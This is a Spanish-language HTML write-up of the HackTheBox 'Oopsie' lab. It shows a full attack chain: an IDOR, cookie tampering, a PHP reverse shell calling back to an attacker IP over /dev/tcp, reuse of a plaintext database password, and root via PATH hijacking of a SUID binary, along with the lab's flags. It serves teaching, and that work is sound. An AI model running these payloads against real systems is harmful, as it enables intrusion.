@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Oopsie — Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1318;
+    --bg3: #141920;
+    --accent: #00ff9d;
+    --accent2: #ff6b35;
+    --accent3: #7b61ff;
+    --text: #c8d6e5;
+    --text-dim: #5a7080;
+    --border: #1e2d3d;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,157,0.015) 2px,
+      rgba(0,255,157,0.015) 4px
+    );
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  header {
+    position: relative;
+    padding: 80px 0 60px;
+    text-align: center;
+    border-bottom: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(0,255,157,0.08) 0%, transparent 70%),
+      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(255,107,53,0.06) 0%, transparent 60%);
+  }
+
+  .header-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 4px;
+    color: var(--accent);
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    opacity: 0.8;
+  }
+
+  h1 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: clamp(52px, 8vw, 96px);
+    font-weight: 700;
+    letter-spacing: -2px;
+    color: #fff;
+    line-height: 1;
+    position: relative;
+  }
+
+  h1 .glow {
+    color: var(--accent);
+    text-shadow: 0 0 40px rgba(0,255,157,0.5), 0 0 80px rgba(0,255,157,0.15);
+  }
+
+  .header-meta {
+    margin-top: 24px;
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 12px;
+    border: 1px solid;
+    letter-spacing: 2px;
+  }
+  .tag.linux  { border-color: var(--accent);  color: var(--accent); }
+  .tag.web    { border-color: var(--accent3); color: var(--accent3); }
+  .tag.suid   { border-color: var(--accent2); color: var(--accent2); }
+  .tag.idor   { border-color: var(--yellow);  color: var(--yellow); }
+  .tag.path   { border-color: var(--red);     color: var(--red); }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 32px;
+  }
+
+  .phase {
+    padding: 64px 0;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    margin-bottom: 36px;
+  }
+
+  .phase-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    white-space: nowrap;
+    opacity: 0.7;
+  }
+
+  .phase-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  h2 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 32px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 1px;
+    margin-bottom: 24px;
+  }
+
+  h2 .accent  { color: var(--accent); }
+  h2 .accent2 { color: var(--accent2); }
+  h2 .accent3 { color: var(--accent3); }
+  h2 .yellow  { color: var(--yellow); }
+  h2 .red     { color: var(--red); }
+
+  p {
+    color: var(--text);
+    margin-bottom: 16px;
+    font-weight: 300;
+    font-size: 17px;
+  }
+
+  .code-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin: 20px 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: #a8d8b0;
+    overflow-x: auto;
+    position: relative;
+    line-height: 1.8;
+    white-space: pre;
+  }
+
+  .code-block.cmd    { border-left-color: var(--accent2); color: #f0a080; }
+  .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }
+  .code-block.shell  { border-left-color: var(--accent3); color: #b8a8e8; }
+  .code-block.php    { border-left-color: var(--yellow);  color: #f0e080; }
+
+  .code-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .finding {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 20px 24px;
+    margin: 20px 0;
+    position: relative;
+  }
+
+  .finding::before {
+    content: '!';
+    position: absolute;
+    top: -1px;
+    left: -1px;
+    background: var(--accent2);
+    color: #000;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 2px 8px;
+    letter-spacing: 2px;
+  }
+
+  .finding.info::before    { content: 'INFO';  background: var(--accent3); color: #fff; }
+  .finding.success::before { content: 'PWN';   background: var(--accent);  color: #000; }
+  .finding.vuln::before    { content: 'VULN';  background: var(--red); color: #fff; }
+  .finding.explain::before { content: 'CÓMO FUNCIONA'; background: var(--yellow); color: #000; }
+
+  .finding-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+    padding-top: 4px;
+  }
+
+  .ports-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    margin: 20px 0;
+  }
+
+  .ports-table th {
+    text-align: left;
+    color: var(--accent);
+    letter-spacing: 3px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .ports-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .ports-table tr:hover td { background: rgba(0,255,157,0.03); }
+  .port-open { color: var(--accent); }
+  .port-num  { color: var(--accent2); font-weight: bold; }
+
+  .flow {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    margin: 28px 0;
+  }
+
+  .flow-step {
+    display: flex;
+    gap: 16px;
+    align-items: flex-start;
+  }
+
+  .flow-icon {
+    width: 36px;
+    height: 36px;
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--yellow);
+    flex-shrink: 0;
+    background: var(--bg2);
+  }
+
+  .flow-connector {
+    width: 36px;
+    display: flex;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .flow-connector::before {
+    content: '';
+    width: 1px;
+    background: linear-gradient(180deg, var(--border), transparent);
+    min-height: 18px;
+    display: block;
+  }
+
+  .flow-content { padding-bottom: 20px; }
+
+  .flow-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 700;
+    font-size: 16px;
+    color: #fff;
+    margin-bottom: 2px;
+  }
+
+  .flow-desc {
+    font-size: 15px;
+    color: var(--text-dim);
+    font-weight: 300;
+  }
+
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    background: rgba(0,255,157,0.07);
+    padding: 1px 6px;
+  }
+
+  code.bad  { color: var(--red);    background: rgba(255,71,87,0.07); }
+  code.warn { color: var(--yellow); background: rgba(255,211,42,0.07); }
+
+  .cookie-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    margin: 20px 0;
+  }
+
+  .cookie-table th {
+    text-align: left;
+    color: var(--accent3);
+    letter-spacing: 3px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .cookie-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .cookie-table tr:hover td { background: rgba(123,97,255,0.04); }
+
+  .flag-box {
+    background: rgba(0,255,157,0.04);
+    border: 1px solid rgba(0,255,157,0.2);
+    padding: 16px 24px;
+    margin: 20px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .flag-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--accent);
+    white-space: nowrap;
+  }
+
+  .flag-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    color: #fff;
+    word-break: break-all;
+  }
+
+  .chain { display: flex; flex-direction: column; gap: 0; margin: 32px 0; }
+  .chain-step { display: flex; gap: 20px; align-items: flex-start; }
+
+  .chain-icon {
+    width: 40px;
+    height: 40px;
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    flex-shrink: 0;
+    background: var(--bg2);
+  }
+
+  .chain-connector {
+    width: 40px;
+    display: flex;
+    justify-content: center;
+    padding: 4px 0;
+    flex-shrink: 0;
+  }
+
+  .chain-connector::before {
+    content: '';
+    width: 1px;
+    height: 100%;
+    background: linear-gradient(180deg, var(--border), transparent);
+    min-height: 20px;
+    display: block;
+  }
+
+  .chain-content { padding-bottom: 24px; }
+
+  .chain-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 700;
+    font-size: 18px;
+    color: #fff;
+    margin-bottom: 4px;
+  }
+
+  .chain-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; }
+
+  footer { padding: 48px 0; text-align: center; }
+
+  .footer-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+  }
+
+  .divider {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+    margin: 8px 0;
+  }
+
+  .highlight { color: var(--accent2); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <div class="header-tag">// HackTheBox — Starting Point — Writeup</div>
+    <h1>OOP<span class="glow">SIE</span></h1>
+    <div class="header-meta">
+      <span class="tag linux">#linux</span>
+      <span class="tag web">#web</span>
+      <span class="tag idor">#idor</span>
+      <span class="tag suid">#suid</span>
+      <span class="tag path">#path-hijacking</span>
+    </div>
+  </div>
+</header>
+
+<main class="container">
+
+  <!-- FASE 1: RECONOCIMIENTO -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 01</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent">RECONOCIMIENTO</span> — Escaneo de puertos</h2>
+
+    <p>Se lanza un escaneo completo para descubrir la superficie de ataque disponible en la máquina víctima.</p>
+
+    <div class="code-label">escaneo inicial</div>
+    <div class="code-block cmd">nmap -sC -sV -oN oopsie.nmap &lt;IP_VICTIMA&gt;</div>
+
+    <table class="ports-table">
+      <thead>
+        <tr>
+          <th>PUERTO</th>
+          <th>ESTADO</th>
+          <th>SERVICIO</th>
+          <th>VERSIÓN</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="port-num">22/tcp</td>
+          <td class="port-open">OPEN</td>
+          <td>SSH</td>
+          <td>OpenSSH 7.6p1</td>
+        </tr>
+        <tr>
+          <td class="port-num">80/tcp</td>
+          <td class="port-open">OPEN</td>
+          <td>HTTP</td>
+          <td>Apache 2.4.29</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <p>La superficie es reducida: una web y SSH. Al acceder a <code>http://&lt;IP_VICTIMA&gt;</code> encontramos la página de una empresa de reparación de coches. A simple vista no hay ningún panel de login ni ruta obvia de acceso.</p>
+
+    <div class="finding info">
+      <div class="finding-title">Tarea 1 — ¿Con qué tipo de herramienta se puede interceptar tráfico web?</div>
+      Respuesta: <strong style="color:#fff">proxy</strong>
+    </div>
+  </section>
+
+  <!-- FASE 2: ENUMERACIÓN WEB -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 02</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="yellow">ENUMERACIÓN WEB</span> — Descubriendo el panel de login</h2>
+
+    <p>Para descubrir rutas ocultas, configuramos <strong>Burp Suite</strong> como proxy del navegador e interceptamos el tráfico al cargar la página principal. En el <em>Site map</em> de Burp, entre los recursos que la página solicita de forma pasiva, aparece una petición GET a:</p>
+
+    <div class="code-block">/cdn-cgi/login/script.js</div>
+
+    <p>Esto delata la existencia del directorio <code>/cdn-cgi/login</code>. Accedemos directamente a esa ruta:</p>
+
+    <div class="code-label">ruta descubierta</div>
+    <div class="code-block cmd">http://&lt;IP_VICTIMA&gt;/cdn-cgi/login</div>
+
+    <p>Aparece un panel de login con usuario y contraseña, y la opción <strong>"Login as Guest"</strong>.</p>
+
+    <div class="finding success">
+      <div class="finding-title">Tarea 2 — ¿Cuál es la ruta del directorio que devuelve el panel de login?</div>
+      Respuesta: <strong style="color:#fff">/cdn-cgi/login</strong>
+    </div>
+  </section>
+
+  <!-- FASE 3: IDOR -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 03</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent3">IDOR</span> — Enumerando el Access ID del administrador</h2>
+
+    <p>Iniciamos sesión pulsando <em>"Login as Guest"</em>. La aplicación nos redirige a:</p>
+
+    <div class="code-block">http://&lt;IP_VICTIMA&gt;/cdn-cgi/login/admin.php?content=accounts&amp;id=2</div>
+
+    <p>El parámetro <code>id=2</code> referencia directamente el registro de nuestra cuenta en la base de datos. Este es el indicador clásico de un <strong>IDOR</strong> (Insecure Direct Object Reference): el servidor confía ciegamente en el valor del parámetro sin validar que el usuario autenticado tenga permisos para ver ese recurso.</p>
+
+    <div class="finding vuln">
+      <div class="finding-title">¿Dónde está la vulnerabilidad?</div>
+      La aplicación expone identificadores numéricos correlativos en la URL. Cualquier usuario autenticado —incluso como invitado— puede leer los datos de cualquier otro usuario simplemente cambiando el valor de <code>id</code>. No existe ningún control de autorización en el servidor.
+    </div>
+
+    <p>Cambiamos el parámetro a <code>id=1</code>, ya que el primer usuario registrado suele ser el administrador:</p>
+
+    <div class="code-label">explotación del IDOR</div>
+    <div class="code-block cmd">http://&lt;IP_VICTIMA&gt;/cdn-cgi/login/admin.php?content=accounts&amp;id=1</div>
+
+    <table class="ports-table">
+      <thead>
+        <tr><th>ACCESS ID</th><th>NAME</th><th>EMAIL</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="port-num">34322</td>
+          <td class="port-open">admin</td>
+          <td>admin@megacorp.com</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="finding success">
+      <div class="finding-title">Tarea 4 — ¿Cuál es el Access ID del usuario administrador?</div>
+      Respuesta: <strong style="color:#fff">34322</strong>
+    </div>
+  </section>
+
+  <!-- FASE 4: COOKIE HIJACKING -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 04</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent2">COOKIE HIJACKING</span> — Escalada a administrador</h2>
+
+    <div class="finding info">
+      <div class="finding-title">Tarea 3 — ¿Qué se puede modificar en Firefox para acceder a la página de uploads?</div>
+      Respuesta: <strong style="color:#fff">cookie</strong>
+    </div>
+
+    <p>La sesión de usuario en la aplicación se gestiona mediante dos cookies: <code>role</code> y <code>user</code>. Con el Access ID del administrador obtenido por IDOR podemos suplantar su sesión modificando estas cookies desde las DevTools del navegador (<strong>F12 → Application → Cookies</strong>) o desde Burp Suite.</p>
+
+    <div class="flow">
+      <div class="flow-step">
+        <div class="flow-icon">1</div>
+        <div class="flow-content">
+          <div class="flow-title">Abrir DevTools → Application → Cookies</div>
+          <div class="flow-desc">Navegamos al panel e inspeccionamos las cookies de sesión actuales correspondientes a la cuenta de invitado.</div>
+        </div>
+      </div>
+      <div class="flow-step"><div class="flow-connector"></div><div></div></div>
+      <div class="flow-step">
+        <div class="flow-icon">2</div>
+        <div class="flow-content">
+          <div class="flow-title">Modificar los valores</div>
+          <div class="flow-desc">Cambiamos <code>role</code> a <code class="warn">admin</code> y <code>user</code> a <code class="warn">34322</code> (el Access ID obtenido por IDOR).</div>
+        </div>
+      </div>
+      <div class="flow-step"><div class="flow-connector"></div><div></div></div>
+      <div class="flow-step">
+        <div class="flow-icon">3</div>
+        <div class="flow-content">
+          <div class="flow-title">Recargar la página</div>
+          <div class="flow-desc">El servidor lee las cookies modificadas, asume que somos el administrador y muestra el panel completo incluyendo la pestaña de <strong>Uploads</strong>.</div>
+        </div>
+      </div>
+    </div>
+
+    <table class="cookie-table">
+      <thead>
+        <tr><th>COOKIE</th><th>VALOR ORIGINAL (GUEST)</th><th>VALOR MODIFICADO</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>role</code></td>
+          <td style="color: var(--text-dim)">guest</td>
+          <td style="color: var(--accent)">admin</td>
+        </tr>
+        <tr>
+          <td><code>user</code></td>
+          <td style="color: var(--text-dim)">2233</td>
+          <td style="color: var(--accent)">34322</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="finding explain">
+      <div class="finding-title">¿Por qué funciona?</div>
+      La aplicación delega el control de permisos en datos que el cliente puede modificar libremente. Al no validar la sesión contra la base de datos en el servidor, cualquier usuario puede otorgarse el rol de administrador simplemente cambiando el valor de una cookie.
+    </div>
+  </section>
+
+  <!-- FASE 5: WEB SHELL -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 05</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="red">WEB SHELL</span> — Ejecución remota de código</h2>
+
+    <div class="finding info">
+      <div class="finding-title">Tarea 5 — Al subir un archivo, ¿en qué directorio aparece en el servidor?</div>
+      Respuesta: <strong style="color:#fff">/uploads</strong>
+    </div>
+
+    <p>Con la sesión de administrador activa, accedemos a la sección de <em>Branding Image Uploads</em>. El formulario permite subir archivos <strong>sin validar su tipo ni contenido</strong>, lo que nos permite subir directamente una reverse shell en PHP.</p>
+
+    <div class="code-label">shell.php</div>
+    <div class="code-block php">&lt;?php
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP_ATACANTE&gt;/4444 0&gt;&amp;1'");
+?&gt;</div>
+
+    <p>Subimos el fichero <code>shell.php</code> a través del formulario de uploads. Antes de activarla nos ponemos en escucha con netcat en nuestra máquina:</p>
+
+    <div class="code-label">listener en nuestra máquina</div>
+    <div class="code-block cmd">nc -lvnp 4444</div>
+
+    <p>Activamos la shell navegando a la ruta donde el servidor ha guardado el archivo:</p>
+
+    <div class="code-label">activar la reverse shell</div>
+    <div class="code-block cmd">http://&lt;IP_VICTIMA&gt;/uploads/shell.php</div>
+
+    <div class="code-label">conexión recibida</div>
+    <div class="code-block output">www-data@oopsie:/$ whoami
+www-data</div>
+
+    <p>Estamos dentro del sistema como <code>www-data</code>, el usuario que ejecuta el servidor web Apache.</p>
+  </section>
+
+  <!-- FASE 6: ESCALADA HORIZONTAL -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 06</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent">ESCALADA HORIZONTAL</span> — De www-data a robert</h2>
+
+    <div class="finding info">
+      <div class="finding-title">Tarea 6 — ¿Qué archivo contiene la contraseña compartida con el usuario robert?</div>
+      Respuesta: <strong style="color:#fff">db.php</strong>
+    </div>
+
+    <p>Enumeramos el sistema de archivos en busca de credenciales. En el directorio donde reside la aplicación de login encontramos un archivo de configuración de base de datos:</p>
+
+    <div class="code-label">inspección del directorio de login</div>
+    <div class="code-block cmd">ls -la /var/www/html/cdn-cgi/login/
+cat /var/www/html/cdn-cgi/login/db.php</div>
+
+    <div class="code-label">contenido de db.php</div>
+    <div class="code-block php">&lt;?php
+$conn = mysqli_connect('localhost', 'robert', 'M3g4C0rpUs3r!', 'garage');
+?&gt;</div>
+
+    <p>Las credenciales de la base de datos están almacenadas en texto plano. El usuario <code>robert</code> reutiliza la misma contraseña para su cuenta del sistema operativo:</p>
+
+    <div class="code-label">cambio de usuario</div>
+    <div class="code-block cmd">su robert
+Password: M3g4C0rpUs3r!</div>
+
+    <div class="code-block output">robert@oopsie:~$ cat user.txt
+f2c74ee8db7983851ab2a96a44eb7981</div>
+
+    <div class="flag-box">
+      <span class="flag-label">USER FLAG</span>
+      <span class="flag-value">f2c74ee8db7983851ab2a96a44eb7981</span>
+    </div>
+  </section>
+
+  <!-- FASE 7: PRIVESC -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 07</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent2">PRIVILEGE ESCALATION</span> — SUID + Path Hijacking</h2>
+
+    <div class="finding info">
+      <div class="finding-title">Tarea 7 — ¿Qué ejecutable se usa con "-group bugtracker" para identificar archivos del grupo?</div>
+      Respuesta: <strong style="color:#fff">find</strong>
+    </div>
+
+    <p>Buscamos binarios con el bit SUID activado pertenecientes al grupo <code>bugtracker</code>, del que el usuario robert es miembro:</p>
+
+    <div class="code-label">búsqueda de binarios SUID del grupo bugtracker</div>
+    <div class="code-block cmd">find / -group bugtracker -ls 2>/dev/null</div>
+
+    <div class="code-label">resultado</div>
+    <div class="code-block output">264151  12 -rwsr-xr--  1 root  bugtracker  8792 Jan 25 2020 /usr/bin/bugtracker</div>
+
+    <div class="finding info">
+      <div class="finding-title">Tarea 8 y 9 — SUID y propietario efectivo</div>
+      La <strong style="color:#fff">s</strong> en los permisos de propietario (<code>-rws</code>) indica el bit <strong style="color:#fff">SUID (Set owner User ID)</strong>. Independientemente del usuario que lo ejecute, el binario siempre correrá con los privilegios de su dueño: <strong style="color:#fff">root</strong>.
+    </div>
+
+    <p>Ejecutamos el binario para analizar su comportamiento interno:</p>
+
+    <div class="code-block cmd">bugtracker</div>
+
+    <div class="code-label">comportamiento del binario</div>
+    <div class="code-block output">------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 12
+--------------
+cat: /root/reports/12: No such file or directory</div>
+
+    <p>El binario llama al comando <code>cat</code> usando una <strong>ruta relativa</strong> en lugar de la ruta absoluta <code>/bin/cat</code>. Para resolver qué ejecutable usar, el sistema busca en los directorios del <code>$PATH</code> de izquierda a derecha y utiliza el primero que encuentre.</p>
+
+    <div class="finding vuln">
+      <div class="finding-title">¿Dónde está la vulnerabilidad?</div>
+      Un binario SUID que invoca comandos sin ruta absoluta es vulnerable a <strong>path hijacking</strong>: si controlamos el <code>$PATH</code>, podemos engañar al binario (que se ejecuta como root) para que llame a un <code>cat</code> malicioso nuestro en lugar del legítimo del sistema.
+    </div>
+
+    <div class="finding info">
+      <div class="finding-title">Tarea 10 — ¿Qué ejecutable se llama de forma insegura?</div>
+      Respuesta: <strong style="color:#fff">cat</strong>
+    </div>
+
+    <p>Explotamos la vulnerabilidad en tres pasos:</p>
+
+    <div class="flow">
+      <div class="flow-step">
+        <div class="flow-icon">1</div>
+        <div class="flow-content">
+          <div class="flow-title">Crear el <code>cat</code> malicioso en /tmp</div>
+          <div class="flow-desc">Escribimos un script que lance una bash con el flag <code>-p</code>, que preserva el EUID (effective UID). Al ejecutarse como root, la bash heredará esos privilegios.</div>
+        </div>
+      </div>
+      <div class="flow-step"><div class="flow-connector"></div><div></div></div>
+      <div class="flow-step">
+        <div class="flow-icon">2</div>
+        <div class="flow-content">
+          <div class="flow-title">Inyectar /tmp al inicio del PATH</div>
+          <div class="flow-desc">Al colocar <code>/tmp</code> antes que <code>/usr/bin</code> y <code>/bin</code> en el PATH, el sistema encontrará primero nuestro <code>cat</code> falso cuando <code>bugtracker</code> lo busque.</div>
+        </div>
+      </div>
+      <div class="flow-step"><div class="flow-connector"></div><div></div></div>
+      <div class="flow-step">
+        <div class="flow-icon">3</div>
+        <div class="flow-content">
+          <div class="flow-title">Ejecutar bugtracker</div>
+          <div class="flow-desc">El binario SUID (corriendo como root) busca <code>cat</code>, lo encuentra en <code>/tmp</code> y lo ejecuta con privilegios de root, entregándonos una shell privilegiada.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="code-label">explotación completa</div>
+    <div class="code-block cmd">cd /tmp
+
+# 1. Crear el cat malicioso
+echo '#!/bin/bash'   > cat
+echo '/bin/bash -p' >> cat
+chmod +x cat
+
+# 2. Inyectar /tmp al inicio del PATH
+export PATH=/tmp:$PATH
+
+# 3. Lanzar el binario SUID
+bugtracker</div>
+
+    <div class="code-label">resultado</div>
+    <div class="code-block output">------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 12
+--------------
+root@oopsie:/tmp# whoami
+root</div>
+
+    <p>Tenemos shell de root. Leemos la flag usando la ruta absoluta de <code>cat</code> para no volver a invocar nuestro script malicioso:</p>
+
+    <div class="code-block cmd">/bin/cat /root/root.txt</div>
+
+    <div class="flag-box">
+      <span class="flag-label">ROOT FLAG</span>
+      <span class="flag-value">af13b0bee69f8a877c3faf667f7beacf</span>
+    </div>
+  </section>
+
+  <!-- RESUMEN -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// RESUMEN</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2>CADENA DE <span class="accent">ATAQUE</span></h2>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-icon">01</div>
+        <div class="chain-content">
+          <div class="chain-title">Enumeración con Burp Suite</div>
+          <div class="chain-desc">El tráfico pasivo interceptado por Burp revela la ruta oculta <code>/cdn-cgi/login</code> con el panel de login de la aplicación.</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--accent3); color: var(--accent3);">02</div>
+        <div class="chain-content">
+          <div class="chain-title">IDOR → Access ID del admin</div>
+          <div class="chain-desc">Cambiando <code>id=2</code> a <code>id=1</code> en la URL se filtra el Access ID <code>34322</code> del administrador sin ningún control de autorización.</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--yellow); color: var(--yellow);">03</div>
+        <div class="chain-content">
+          <div class="chain-title">Cookie Hijacking → panel admin</div>
+          <div class="chain-desc">Modificando <code>role=admin</code> y <code>user=34322</code> en las cookies, el servidor concede acceso completo al panel de administración con la sección de uploads.</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--red); color: var(--red);">04</div>
+        <div class="chain-content">
+          <div class="chain-title">Web Shell PHP → RCE como www-data</div>
+          <div class="chain-desc">El uploader no valida el tipo de archivo. Se sube <code>shell.php</code> y se accede a <code>/uploads/shell.php</code> para obtener una reverse shell en el servidor.</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--accent2); color: var(--accent2);">05</div>
+        <div class="chain-content">
+          <div class="chain-title">Credenciales en db.php → usuario robert</div>
+          <div class="chain-desc"><code>db.php</code> expone la contraseña de la base de datos en texto plano. Robert reutiliza esa misma contraseña para su cuenta del sistema.</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--accent); color: var(--accent);">⚡</div>
+        <div class="chain-content">
+          <div class="chain-title" style="color: var(--accent);">Path Hijacking SUID → Root</div>
+          <div class="chain-desc">El binario <code>bugtracker</code> (SUID root) invoca <code>cat</code> por ruta relativa. Creando un <code>cat</code> malicioso en <code>/tmp</code> e inyectándolo al PATH se obtiene una shell de root.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="container">
+    <div class="divider"></div>
+    <br>
+    <div class="footer-text">OOPSIE // WRITEUP // HACKTHEBOX — STARTING POINT</div>
+  </div>
+</footer>
+
+</body>
+</html>
